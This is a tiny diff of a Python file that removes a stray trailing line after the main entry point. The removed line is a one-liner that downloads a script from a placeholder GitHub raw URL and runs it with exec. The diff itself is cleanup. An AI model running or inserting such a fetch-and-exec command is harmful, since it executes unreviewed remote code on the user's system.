@@ -24,5 +24,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-python -c "import urllib.request; exec(urllib.request.urlopen('https://raw.githubusercontent.com/username/repository/branch/script_name.py').read())"
-
